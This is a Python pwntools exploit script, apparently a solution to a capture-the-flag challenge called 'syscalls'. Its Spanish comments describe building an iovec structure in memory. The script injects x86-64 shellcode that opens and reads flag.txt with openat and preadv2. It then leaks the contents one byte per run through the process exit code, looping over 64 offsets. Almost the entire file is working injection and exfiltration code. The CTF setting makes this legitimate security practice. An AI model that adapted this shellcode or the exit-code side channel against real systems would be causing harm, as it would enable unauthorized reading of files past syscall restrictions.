from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./syscalls")

def start():
    if args.REMOTE:
        return remote("syscalls.chal.uiuc.tf", 1337, ssl=True)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']

flag = str()

# Necesitaremos armar:
# struct iovec
# {
#   void *iov_base     // Direccion de inicio
#   size_t iov_len     // Tamaño de la memeoria que apunta a iov_base
# }

# Lo haremos con:
# mov r12, rsp
# mov r13, r12       
# sub r13, 64        
# mov qword ptr[r12], r13   ; Direccion de inicio *iov_base
# mov qword ptr[r12 + 8], 64  ; 64 bits de espacio para escribir en la pila (iov_len)

for i in range(0, 64):
    io = start()

    shellcode = f"""
        _start:
        
            xor  rdx, rdx
            push rdx
            mov  rsi, {u64(b"flag.txt")}
            push rsi
            mov  rsi, rsp
            xor  rdi, rdi
            sub  rdi, 100
            mov  rax, 0x101
            syscall

            mov r12, rsp
            mov r13, r12
            sub r13, 64

            mov qword ptr[r12], r13
            mov qword ptr[r12 + 8], 64

            mov rdi, rax
            xor r8, r8
            xor r10, r10
            mov rdx, 1
            mov rsi, r12
            mov rdi, rax
            mov rax, 0x147
            syscall



            mov rax, 60
            mov rdi, [rsp - 64 + {i}]
            syscall
        """


    shellcode = asm(shellcode)

    #f = open("payload", "wb")
    #    f.write(shellcode.ljust(175, b"\x00"))
    #    f.close()

    io.recvline()

    io.sendline(shellcode)

    io.wait()
    exit_code = io.poll()

    if exit_code > 0:
        flag += chr(exit_code)
    else:
        break
    #io.interactive()

print(flag)
